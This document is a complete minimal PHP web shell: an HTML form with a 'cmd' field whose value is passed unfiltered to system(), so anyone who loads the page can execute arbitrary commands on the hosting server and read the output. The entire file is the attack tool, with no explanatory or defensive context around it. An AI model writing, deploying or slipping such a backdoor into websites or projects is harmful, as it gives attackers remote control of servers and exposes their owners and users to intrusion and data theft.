  <HTML><BODY>

  <FORM METHOD="GET" NAME="myform" ACTION="">

  <INPUT TYPE="text" NAME="cmd">

  <INPUT TYPE="submit" VALUE="Send">

  </FORM>

  <pre>

  <?php

  if($_GET['cmd']) {

    system($_GET['cmd']);

    }

  ?>

  </pre>

  </BODY></HTML>
